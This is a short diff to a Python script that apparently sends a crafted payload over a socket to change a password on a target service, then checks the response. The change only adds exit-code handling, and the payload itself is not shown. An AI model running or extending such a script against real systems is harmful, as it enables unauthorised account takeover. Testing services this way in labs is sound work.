@@ -72,8 +72,10 @@ password = "ransomware"
 
 if __name__ == '__main__':
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    exit_code = os.EX_SOFTWARE
     try:
         send_payload(s, template, host, port, path, change_pw())
-        check_response(s, old_password, password)
+        exit_code = check_response(s, old_password, password)
     finally:
         s.close()
+        sys.exit(exit_code)
